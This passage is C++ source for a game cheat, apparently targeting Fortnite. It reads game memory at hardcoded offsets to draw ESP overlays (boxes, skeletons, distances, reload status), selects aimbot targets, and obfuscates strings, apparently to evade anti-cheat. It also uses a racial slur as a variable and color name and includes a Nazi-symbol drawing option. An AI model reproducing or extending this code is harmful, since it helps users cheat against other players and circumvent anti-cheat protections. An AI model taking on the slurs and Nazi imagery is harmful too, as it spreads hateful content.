		Actors::PlayerCameraManager = read<DWORD_PTR>(Actors::PlayerController + 0x338);
		Actors::PlayerCamManager = read<DWORD_PTR>(Actors::LocalPawn + Actors::PlayerCameraManager);
		Actors::Rootcomp = read<DWORD_PTR>(Actors::LocalPawn + OFFSETS::RootComponet);
		Actors::Persistentlevel = read<DWORD_PTR>(Actors::Uworld + OFFSETS::PersistentLevel);
		Actors::Crrneytwep = read<uintptr_t>(Actors::LocalPawn + 0x868);
		Actors::ActorCount = read<DWORD>(Actors::Persistentlevel + OFFSETS::ActorCount);
		Actors::AActors = read<DWORD_PTR>(Actors::Persistentlevel + OFFSETS::AActor);
		char bisDying = read<char>(Actors::Localplayer + 0x6d8);
		char bisBot = read<char>(Actors::PlayerState + 0x27a);
		auto bIsReloadingWeapon = read<bool>(Actors::Crrneytwep + 0x329);
		Actors::GameState = read<DWORD_PTR>(Actors::Uworld + 0x148);
		Actors::PlayerArray = read<DWORD_PTR>(Actors::GameState + 0x2A0);
		Actors::bInCar = read<DWORD_PTR>(0x2e0 + 0x2c3);
		bool InLobby;
		InLobby = false;
		if (!Actors::LocalPawn) {
			InLobby = true;
		}

		for (int i = 0; i < Esp_VisDist; i++)
		{
			auto player = read<uintptr_t>(Actors::PlayerArray + i * 0x8);
			auto CurrentActor = read<uintptr_t>(player + 0x300);//PawnPrivate
			DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + 0x290);
			int ActorTeamId = read<int>(otherPlayerState + OFFSETS::TeamId);
			int MyTeamId = read<int>(Actors::PlayerState + OFFSETS::TeamId);

			if (MyTeamId == ActorTeamId) continue;
			if (CurrentActor == Actors::LocalPawn) continue;
			if (!CurrentActor) { continue; }
		}
	}

	Sleep(0.5);
	return;
}

void Init() {

	//auto funcName = GetObjectFirstName(func);

	if (Aim_fovCircle)
	{
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Width / 2, Height / 2), Aim_FovSize, ImColor(128, 224, 0, 200), 27, 1.0f);
	}
	if (Aim_square) {

		ImGui::GetOverlayDrawList()->AddRect(ImVec2(ScreenCenterX - Aim_FovSize, ScreenCenterY - Aim_FovSize), ImVec2(ScreenCenterX + Aim_FovSize, ScreenCenterY + Aim_FovSize), ImColor(128, 224, 0, 200), 0, 2, 1.f);
	}

	if (Filledfov)
	{
		ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(1920 / 2, 1080 / 2), Aim_FovSize, ImColor(0, 0, 0, 180), 3);
	}

	if (crosshair)
	{
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2.01f - 14, Height / 2), ImVec2(Width / 2.01f + 1, Height / 2), ImColor(255, 255, 255, 255), 0.5f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 1.99f + 14, Height / 2), ImVec2(Width / 1.99f + 1, Height / 2), ImColor(255, 255, 255, 255), 0.5f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2.01f - 14), ImVec2(Width / 2, Height / 2.01f), ImColor(255, 255, 255, 255), 0.5f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 1.99f + 14), ImVec2(Width / 2, Height / 1.99f), ImColor(255, 255, 255, 255), 0.5f);
	}

	if (heilhitler)
	{
		DrawCrossNazi(10, ImColor(255, 0, 0, 255)); // Outdated
	}

	if (hitboxpos == 0)
	{
		hitbox = BONE_HEAD_ID; //head
	}
	else if (hitboxpos == 1)
	{
		hitbox = BONE_NECK_ID; //neck
	}
	else if (hitboxpos == 2)
	{
		hitbox = BONE_CHEST_ID; //chest
	}
	else if (hitboxpos == 3)
	{
		hitbox = BONE_PELVIS_ID; //pelvis
	}

	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;

	for (int i = 0; i < Esp_VisDist; i++)
	{
		auto player = read<uintptr_t>(Actors::PlayerArray + i * 0x8);
		auto CurrentActor = read<uintptr_t>(player + 0x300);//PawnPrivate
		uintptr_t currentgun = read<uintptr_t>(CurrentActor + 0x828);
		auto AmmoCount = read<int>(currentgun + 0xB64);
		auto bIsReloadingWeapon = read<bool>(currentgun + 0x329);
		auto health = read<int>(Actors::LocalPawn + 0x34);
		int NewPlayerLocationX;
		int NewPlayerLocationY;
		uint64_t CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::Mesh);
		int MyTeamId = read<int>(Actors::PlayerState + OFFSETS::TeamId);
		DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + 0x290);
		int ActorTeamId = read<int>(otherPlayerState + OFFSETS::TeamId);
		//auto isDBNO = (read<char>(CurrentActor + 0x782) >> 4) & 1;

		auto entityListCopy = entityList;
		int LocalTeam;
		Vector3 Headpos = GetBoneWithRotation(CurrentActorMesh, 68);
		Vector3 footpos = GetBoneWithRotation(CurrentActorMesh, 83);
		Actors::localactorpos = read<Vector3>(Actors::Rootcomp + 0x128);
		auto normal_head = W2S(Headpos);
		float distance = Actors::localactorpos.Distance(Headpos) / 80.f;
		float ranged = Actors::localactorpos.Distance(Headpos) / 10.f;


		Vector3 bone0 = GetBoneWithRotation(CurrentActorMesh, 0);
		Vector3 bottom = W2S(bone0);
		Vector3 Headbox = W2S(Vector3(Headpos.x, Headpos.y, Headpos.z + 15));
		Vector3 w2shead = W2S(Headpos);

		uint64_t LocalPlayerState = read<uint64_t>(Actors::LocalPawn + 0x2B8);
		LocalTeam = read<int>(LocalPlayerState + 0x1068);

		float BoxHeight = (float)(Headbox.y - bottom.y);
		float BoxWidth = BoxHeight * BoxWidthValue;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)bottom.y;

		float CornerHeight = abs(Headbox.y - bottom.y);
		float CornerWidth = CornerHeight * BoxWidthValue;

		if (vischeck) {

			if (distance < Esp_VisDist)
			{

				if (Esp)
				{

					if (Esp_3DBox) {
						RGBA visable = { 255, 255, 255, 255 };

						Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
						Vector3 vRootBone = GetBoneWithRotation(CurrentActorMesh, 0);
						Vector3 vHeadBoneOut = W2S(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
						Vector3 vRootBoneOut = W2S(vRootBone);

						if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
						{

							Vector3 bottom1 = W2S(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
							Vector3 bottom2 = W2S(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
							Vector3 bottom3 = W2S(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
							Vector3 bottom4 = W2S(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));

							Vector3 top1 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
							Vector3 top2 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
							Vector3 top3 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
							Vector3 top4 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));

							if (isVisible(CurrentActorMesh))
							{
								DrawLine(bottom1.x, bottom1.y, top1.x, top1.y, &Col.white, 0.1f);
								DrawLine(bottom1.x, bottom1.y, top2.x, top2.y, &Col.white, 0.1f);
								DrawLine(bottom1.x, bottom1.y, top3.x, top3.y, &Col.white, 0.1f);
								DrawLine(bottom4.x, bottom4.y, top4.x, top4.y, &Col.white, 0.1f);

								DrawLine(bottom1.x, bottom1.y, bottom2.x, bottom2.y, &Col.white, 0.1f);
								DrawLine(bottom2.x, bottom2.y, bottom3.x, bottom3.y, &Col.white, 0.1f);
								DrawLine(bottom3.x, bottom3.y, bottom4.x, bottom4.y, &Col.white, 0.1f);
								DrawLine(bottom4.x, bottom4.y, bottom1.x, bottom1.y, &Col.white, 0.1f);

								DrawLine(top1.x, top1.y, top2.x, top2.y, &Col.white, 0.1f);
								DrawLine(top2.x, top2.y, top3.x, top3.y, &Col.white, 0.1f);
								DrawLine(top3.x, top3.y, top4.x, top4.y, &Col.white, 0.1f);
								DrawLine(top4.x, top4.y, top1.x, top1.y, &Col.white, 0.1f);

								if (Esp_Distance) {
									XorS(dst, "[%.fm]\n");
									char dist[64];
									sprintf_s(dist, dst.decrypt(), distance);
									DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 25), 17.0f, IM_COL32(255, 255, 0, 255), true);
								}
							}
							else
							{
								DrawLine(bottom1.x, bottom1.y, top1.x, top1.y, &Col.red, 0.1f);
								DrawLine(bottom1.x, bottom1.y, top2.x, top2.y, &Col.red, 0.1f);
								DrawLine(bottom1.x, bottom1.y, top3.x, top3.y, &Col.red, 0.1f);
								DrawLine(bottom4.x, bottom4.y, top4.x, top4.y, &Col.red, 0.1f);

								DrawLine(bottom1.x, bottom1.y, bottom2.x, bottom2.y, &Col.red, 0.1f);
								DrawLine(bottom2.x, bottom2.y, bottom3.x, bottom3.y, &Col.red, 0.1f);
								DrawLine(bottom3.x, bottom3.y, bottom4.x, bottom4.y, &Col.red, 0.1f);
								DrawLine(bottom4.x, bottom4.y, bottom1.x, bottom1.y, &Col.red, 0.1f);

								DrawLine(top1.x, top1.y, top2.x, top2.y, &Col.red, 0.1f);
								DrawLine(top2.x, top2.y, top3.x, top3.y, &Col.red, 0.1f);
								DrawLine(top3.x, top3.y, top4.x, top4.y, &Col.red, 0.1f);
								DrawLine(top4.x, top4.y, top1.x, top1.y, &Col.red, 0.1f);

								if (Esp_Distance) {
									XorS(dst, "[%.fm]\n");
									char dist[64];
									sprintf_s(dist, dst.decrypt(), distance);
									DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 25), 17.0f, IM_COL32(255, 0, 0, 255), true);
								}
							}
						}
					}

					if (Esp_targetlines)
					{
						Vector3 Hitbox = GetBoneWithRotation(CurrentActorMesh, hitbox);
						Vector3 PlayerHitbox = W2S(Hitbox);

						if (!isVisible(CurrentActorMesh)) {
							AimbotTracerLines(closestPawn, ImColor(3434));
							//DrawLine(Width / 2 - 0, Height / 2 - 0, bottom.x, bottom.y, &Col.orange, 0.5);
						}
						else {
							AimbotTracerLines(closestPawn, ImColor(3434));
							//DrawLine(Width / 2 - 0, Height / 2 - 0, bottom.x, bottom.y, &Col.orange, 0.5);
						}
					}

					if (reloadCheck)
					{
						if (isVisible(CurrentActorMesh)) {
							if (bIsReloadingWeapon)
								ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 255, 0, 255), "PLAYER RELOADING");
						}
						else {
							if (bIsReloadingWeapon)
								ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 0, 0, 255), "PLAYER RELOADING");
						}
					}

					if (DrawEnemyFov)
					{
						ImU32 FovVisCheck;
						if (isVisible(CurrentActorMesh))
							FovVisCheck = ImGui::GetColorU32({ 255, 255, 255, 255 });
						else
							FovVisCheck = ImGui::GetColorU32({ 255,0,0,255 });

						Vector3 HitBox = GetBoneWithRotation(CurrentActorMesh, hitbox);
						Vector3 HitBoxPos = W2S(Vector3(HitBox.x, HitBox.y, HitBox.z + 15));
						bool TooClose = false;
						float ranged = Actors::localactorpos.Distance(Headpos) / 10.f;

						if (distance <= ranged)
							TooClose = true;
						else
							TooClose = false;

						if (TooClose == false)
							Esp_VisualSize = distance;

						ImGui::GetOverlayDrawList()->AddCircle(ImVec2(HitBoxPos.x, HitBoxPos.y), Esp_VisualSize, FovVisCheck, 27, 1.0f);
					}

					bool nigger = false;
					if (nigger)
					{
						uintptr_t CurrentWeapon = read<uintptr_t>(Actors::PlayerState + 0x868);
						auto AmmoCount = read<int>(CurrentWeapon + 0xB64);

						char buffer[128];
						sprintf_s(buffer, "Ammo: %i", AmmoCount);
						if (buffer != "?")
						{
							if (isVisible(CurrentActorMesh)) {
								ImVec2 DistanceTextSize = ImGui::CalcTextSize(buffer);
								DrawString(12, bottom.x - DistanceTextSize.x / 2, bottom.y + DistanceTextSize.y / 2 + 20, &Col.white, false, false, buffer);
							}
							else {
								ImVec2 DistanceTextSize = ImGui::CalcTextSize(buffer);
								DrawString(12, bottom.x - DistanceTextSize.x / 2, bottom.y + DistanceTextSize.y / 2 + 20, &Col.red, false, false, buffer);
							}
						}

						//Not working bc pasta
					}

					if (playerbot)
					{
						if (isVisible(CurrentActorMesh)) {
							auto fname = GetNameFromFName(Actors::CurrentActorId);
							if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
								DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("BOT"));
							else
								DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("PLAYER"));
						}
						else {
							auto fname = GetNameFromFName(Actors::CurrentActorId);
							if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
								DrawString(15, Headbox.x, Headbox.y, &Col.red, true, true, ("BOT"));
							else
								DrawString(15, Headbox.x, Headbox.y, &Col.red, true, true, ("PLAYER"));
						}
					}


					if (Esp_fillbox)
					{
						DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, &Col.FiledBox);
					}

					if (Esp_box)
					{
						if (isVisible(CurrentActorMesh))
						{
							// rgba(0, 255, 231, 0)
							DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(255, 255, 255, 255), 2.5);

							if (Esp_Distance) {
								XorS(dst, "[%.fm]\n");
								char dist[64];
								sprintf_s(dist, dst.decrypt(), distance);
								DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 255, 255), true);
							}
						}
						else {
							// rgba(0, 255, 231, 1)
							DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(255, 0, 0, 255), 2.5);

							if (Esp_Distance) {
								XorS(dst, "[%.fm]\n");
								char dist[64];
								sprintf_s(dist, dst.decrypt(), distance);
								DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 0, 0, 255), true);
							}
						}
					}

					if (Esp_fbox)
					{
						if (isVisible(CurrentActorMesh))
						{
							DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 1.5f, IM_COL32(255, 255, 255, 255));

							if (Esp_Distance) {
								XorS(dst, "[%.fm]\n");
								char dist[64];
								sprintf_s(dist, dst.decrypt(), distance);
								DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 255, 255), true);
							}
						}
						else {
							DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 1.5f, IM_COL32(255, 0, 0, 255));

							if (Esp_Distance) {
								XorS(dst, "[%.fm]\n");
								char dist[64];
								sprintf_s(dist, dst.decrypt(), distance);
								DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 0, 0, 255), true);
							}
						}
					}


					if (Esp_line)
					{
						if (isVisible(CurrentActorMesh))
						{
							DrawLine(Width / 2 - 0, Height, bottom.x, bottom.y, &Col.NiggaGreen, 0.5);
						}
						else {
							DrawLine(Width / 2 - 0, Height, bottom.x, bottom.y, &Col.red, 0.5);
						}
					}

					if (Esp_Skeleton)
					{
						Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
						Vector3 vHip = GetBoneWithRotation(CurrentActorMesh, 2);
						Vector3 vNeck = GetBoneWithRotation(CurrentActorMesh, 67);
						Vector3 vUpperArmLeft = GetBoneWithRotation(CurrentActorMesh, 9);
						Vector3 vUpperArmRight = GetBoneWithRotation(CurrentActorMesh, 38);
						Vector3 vLeftHand = GetBoneWithRotation(CurrentActorMesh, 10);
						Vector3 vRightHand = GetBoneWithRotation(CurrentActorMesh, 39);
						Vector3 vLeftHand1 = GetBoneWithRotation(CurrentActorMesh, 30);
						Vector3 vRightHand1 = GetBoneWithRotation(CurrentActorMesh, 59);
						Vector3 vRightThigh = GetBoneWithRotation(CurrentActorMesh, 78);
						Vector3 vLeftThigh = GetBoneWithRotation(CurrentActorMesh, 71);
						Vector3 vRightCalf = GetBoneWithRotation(CurrentActorMesh, 79);
						Vector3 vLeftCalf = GetBoneWithRotation(CurrentActorMesh, 72);
						Vector3 vLeftFoot = GetBoneWithRotation(CurrentActorMesh, 73);
						Vector3 vRightFoot = GetBoneWithRotation(CurrentActorMesh, 80);
						Vector3 vHeadBoneOut = W2S(vHeadBone);
						Vector3 vHipOut = W2S(vHip);
						Vector3 vNeckOut = W2S(vNeck);
						Vector3 vUpperArmLeftOut = W2S(vUpperArmLeft);
						Vector3 vUpperArmRightOut = W2S(vUpperArmRight);
						Vector3 vLeftHandOut = W2S(vLeftHand);
						Vector3 vRightHandOut = W2S(vRightHand);
						Vector3 vLeftHandOut1 = W2S(vLeftHand1);
						Vector3 vRightHandOut1 = W2S(vRightHand1);
						Vector3 vRightThighOut = W2S(vRightThigh);
						Vector3 vLeftThighOut = W2S(vLeftThigh);
						Vector3 vRightCalfOut = W2S(vRightCalf);
						Vector3 vLeftCalfOut = W2S(vLeftCalf);
						Vector3 vLeftFootOut = W2S(vLeftFoot);
						Vector3 vRightFootOut = W2S(vRightFoot);

						DrawLine(vHeadBoneOut.x, vHeadBoneOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vHipOut.x, vHipOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vLeftHandOut.x, vLeftHandOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.white, 0.6f);
						DrawLine(vRightHandOut.x, vRightHandOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.white, 0.6f);
						DrawLine(vLeftHandOut.x, vLeftHandOut.y, vLeftHandOut1.x, vLeftHandOut1.y, &Col.white, 0.6f);
						DrawLine(vRightHandOut.x, vRightHandOut.y, vRightHandOut1.x, vRightHandOut1.y, &Col.white, 0.6f);
						DrawLine(vLeftThighOut.x, vLeftThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
						DrawLine(vRightThighOut.x, vRightThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
						DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.white, 0.6f);
						DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.white, 0.6f);
						DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.white, 0.6f);
						DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.white, 0.6f);

					}

				}

			}


			auto dx = w2shead.x - (Width / 2);
			auto dy = w2shead.y - (Height / 2);
			auto dist = sqrtf(dx * dx + dy * dy);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(Actors::CurrentActorId) + 0x7C2) >> 4) & 1;
			if (isVisible(CurrentActorMesh)) {
				if (!isDBNO) {
					if (dist < Aim_AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = CurrentActor;
					}
				}
			}

		}
		else {

			if (distance < Esp_VisDist)
			{

				if (Esp)
				{

					if (DrawEnemyFov)
					{
						ImU32 FovVisCheck;
						FovVisCheck = ImGui::GetColorU32({ 255, 255, 255, 255 });
						Vector3 Neckpos = GetBoneWithRotation(CurrentActorMesh, hitbox);
						Vector3 Neckbox = W2S(Vector3(Neckpos.x, Neckpos.y, Neckpos.z + 15));
						ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Neckbox.x, Neckbox.y), Esp_VisualSize, FovVisCheck, 150, 1.0f);

						bool TooClose;
						if (distance <= ranged)
							TooClose = true;
						else
							TooClose = false;

						if (TooClose == false)
							Esp_VisualSize = distance;
					}

					if (Esp_targetlines)
					{
						Vector3 Hitbox = GetBoneWithRotation(CurrentActorMesh, hitbox);
						Vector3 PlayerHitbox = W2S(Hitbox);
						AimbotTracerLines(closestPawn, ImColor(3434334));
						//DrawLine(Width / 2 - 0, Height / 2 - 0, bottom.x, bottom.y, &Col.orange, 0.5);
					}

					if (Esp_3DBox) {

						Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
						Vector3 vRootBone = GetBoneWithRotation(CurrentActorMesh, 0);
						Vector3 vHeadBoneOut = W2S(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
						Vector3 vRootBoneOut = W2S(vRootBone);

						if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
						{

							Vector3 bottom1 = W2S(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
							Vector3 bottom2 = W2S(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
							Vector3 bottom3 = W2S(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
							Vector3 bottom4 = W2S(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));

							Vector3 top1 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
							Vector3 top2 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
							Vector3 top3 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
							Vector3 top4 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), IM_COL32(128, 224, 0, 200), 0.1f);

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), IM_COL32(128, 224, 0, 200), 0.1f);

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), IM_COL32(128, 224, 0, 200), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), IM_COL32(128, 224, 0, 200), 0.1f);

							if (Esp_Distance) {
								XorS(dst, "[%.fm]\n");
								char dist[64];
								sprintf_s(dist, dst.decrypt(), distance);
								DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(128, 224, 0, 200), true);
							}
						}
					}


					if (reloadCheck)
					{
						if (bIsReloadingWeapon)
							ImGui::GetOverlayDrawList()->AddText(ImVec2(Headbox.x, Headbox.y + 20), IM_COL32(255, 0, 0, 255), "PLAYER RELOADING");
					}

					bool nigger;
					if (nigger)
					{
						uintptr_t CurrentWeapon = read<uintptr_t>(Actors::PlayerState + 0x868);
						auto AmmoCount = read<int>(CurrentWeapon + 0xB64);

						char buffer[128];
						sprintf_s(buffer, "Ammo: %i", AmmoCount);
						if (buffer != "?")
						{
							ImVec2 DistanceTextSize = ImGui::CalcTextSize(buffer);
							DrawString(12, Headbox.x - DistanceTextSize.x / 2, Headbox.y + DistanceTextSize.y / 2 + 20, &Col.SilverWhite, false, false, buffer);
						}

						// Not working
					}

					if (playerbot)
					{
						auto fname = GetNameFromFName(Actors::CurrentActorId);
						if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
							DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("BOT"));
						else
							DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("PLAYER"));
					}

					if (Esp_fillbox)
					{
						DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, &Col.FiledBox);
					}

					if (Esp_box)
					{

						// rgba(0, 255, 231, 0)
						DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(255, 255, 0, 255), 2.5);

						if (Esp_Distance) {
							XorS(dst, "[%.fm]\n");
							char dist[64];
							sprintf_s(dist, dst.decrypt(), distance);
							DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 0, 255), true);
						}
					}

					if (Esp_fbox)
					{
						DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 1.5f, IM_COL32(255, 255, 0, 255));

						if (Esp_Distance) {
							XorS(dst, "[%.fm]\n");
							char dist[64];
							sprintf_s(dist, dst.decrypt(), distance);
							DrawOutlinedText(m_pFont, dist, ImVec2(Headbox.x, Headbox.y - 35), 17.0f, IM_COL32(255, 255, 0, 255), true);
						}
					}

					if (Esp_line)
					{
						DrawLine(Width / 2 - 0, Height, bottom.x, bottom.y, &Col.white, 0.5);
					}

					if (Esp_Skeleton)
					{
						Vector3 vHeadBone = GetBoneWithRotation(CurrentActorMesh, 68);
						Vector3 vHip = GetBoneWithRotation(CurrentActorMesh, 2);
						Vector3 vNeck = GetBoneWithRotation(CurrentActorMesh, 67);
						Vector3 vUpperArmLeft = GetBoneWithRotation(CurrentActorMesh, 9);
						Vector3 vUpperArmRight = GetBoneWithRotation(CurrentActorMesh, 38);
						Vector3 vLeftHand = GetBoneWithRotation(CurrentActorMesh, 10);
						Vector3 vRightHand = GetBoneWithRotation(CurrentActorMesh, 39);
						Vector3 vLeftHand1 = GetBoneWithRotation(CurrentActorMesh, 30);
						Vector3 vRightHand1 = GetBoneWithRotation(CurrentActorMesh, 59);
						Vector3 vRightThigh = GetBoneWithRotation(CurrentActorMesh, 78);
						Vector3 vLeftThigh = GetBoneWithRotation(CurrentActorMesh, 71);
						Vector3 vRightCalf = GetBoneWithRotation(CurrentActorMesh, 79);
						Vector3 vLeftCalf = GetBoneWithRotation(CurrentActorMesh, 72);
						Vector3 vLeftFoot = GetBoneWithRotation(CurrentActorMesh, 73);
						Vector3 vRightFoot = GetBoneWithRotation(CurrentActorMesh, 80);
						Vector3 vHeadBoneOut = W2S(vHeadBone);
						Vector3 vHipOut = W2S(vHip);
						Vector3 vNeckOut = W2S(vNeck);
						Vector3 vUpperArmLeftOut = W2S(vUpperArmLeft);
						Vector3 vUpperArmRightOut = W2S(vUpperArmRight);
						Vector3 vLeftHandOut = W2S(vLeftHand);
						Vector3 vRightHandOut = W2S(vRightHand);
						Vector3 vLeftHandOut1 = W2S(vLeftHand1);
						Vector3 vRightHandOut1 = W2S(vRightHand1);
						Vector3 vRightThighOut = W2S(vRightThigh);
						Vector3 vLeftThighOut = W2S(vLeftThigh);
						Vector3 vRightCalfOut = W2S(vRightCalf);
						Vector3 vLeftCalfOut = W2S(vLeftCalf);
						Vector3 vLeftFootOut = W2S(vLeftFoot);
						Vector3 vRightFootOut = W2S(vRightFoot);
						DrawLine(vHeadBoneOut.x, vHeadBoneOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vHipOut.x, vHipOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
						DrawLine(vLeftHandOut.x, vLeftHandOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.white, 0.6f);
						DrawLine(vRightHandOut.x, vRightHandOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.white, 0.6f);
